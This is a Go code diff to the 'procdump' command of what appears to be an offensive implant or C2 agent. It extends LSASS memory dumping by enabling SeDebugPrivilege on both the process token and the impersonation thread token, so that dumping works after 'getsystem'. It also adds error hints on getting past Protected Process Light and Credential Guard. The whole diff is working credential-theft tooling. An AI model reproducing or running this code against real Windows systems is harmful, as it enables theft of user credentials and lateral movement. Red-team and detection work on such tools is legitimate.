@@ -60,14 +60,10 @@ func (c *ProcdumpCommand) Execute(task structs.Task) structs.CommandResult {
 		args.Action = "lsass"
 	}
 
-	// Enable SeDebugPrivilege for access to protected processes
-	if err := enableDebugPrivilege(); err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Failed to enable SeDebugPrivilege: %v (need admin privileges)", err),
-			Status:    "error",
-			Completed: true,
-		}
-	}
+	// Enable SeDebugPrivilege on both process and thread tokens
+	// Thread token is needed when impersonating (e.g., after getsystem)
+	enableDebugPrivilege()
+	enableThreadDebugPrivilege()
 
 	var targetPID uint32
 	var processName string
@@ -114,8 +110,18 @@ func (c *ProcdumpCommand) Execute(task structs.Task) structs.CommandResult {
 		targetPID,
 	)
 	if err != nil {
+		errMsg := fmt.Sprintf("OpenProcess failed for PID %d (%s): %v", targetPID, processName, err)
+		if strings.EqualFold(processName, "lsass.exe") {
+			errMsg += "\nPossible causes:"
+			errMsg += "\n  - LSASS is running as Protected Process Light (PPL) — check RunAsPPL registry key"
+			errMsg += "\n  - Credential Guard is enabled"
+			errMsg += "\n  - Insufficient privileges (need SYSTEM + SeDebugPrivilege)"
+			errMsg += "\nTip: Try 'getsystem' first, or dump a non-PPL process with -action dump -pid <PID>"
+		} else {
+			errMsg += "\nEnsure you have admin privileges and SeDebugPrivilege."
+		}
 		return structs.CommandResult{
-			Output:    fmt.Sprintf("OpenProcess failed for PID %d (%s): %v\nEnsure you have admin privileges and SeDebugPrivilege.", targetPID, processName, err),
+			Output:    errMsg,
 			Status:    "error",
 			Completed: true,
 		}
@@ -279,6 +285,37 @@ func getProcessName(pid uint32) (string, error) {
 	}
 
 	return "", fmt.Errorf("PID %d not found", pid)
+}
+
+// enableThreadDebugPrivilege enables SeDebugPrivilege on the current thread's
+// impersonation token. This is needed when running under an impersonated context
+// (e.g., after getsystem) because OpenProcess uses the thread token for access checks.
+func enableThreadDebugPrivilege() error {
+	var token windows.Token
+	err := windows.OpenThreadToken(windows.CurrentThread(), windows.TOKEN_ADJUST_PRIVILEGES|windows.TOKEN_QUERY, false, &token)
+	if err != nil {
+		// No impersonation token — process token is used (enableDebugPrivilege handles that)
+		return err
+	}
+	defer token.Close()
+
+	var luid windows.LUID
+	err = windows.LookupPrivilegeValue(nil, windows.StringToUTF16Ptr("SeDebugPrivilege"), &luid)
+	if err != nil {
+		return err
+	}
+
+	tp := windows.Tokenprivileges{
+		PrivilegeCount: 1,
+		Privileges: [1]windows.LUIDAndAttributes{
+			{
+				Luid:       luid,
+				Attributes: windows.SE_PRIVILEGE_ENABLED,
+			},
+		},
+	}
+
+	return windows.AdjustTokenPrivileges(token, false, &tp, 0, nil, nil)
 }
 
 // formatDumpSize formats bytes into human-readable size
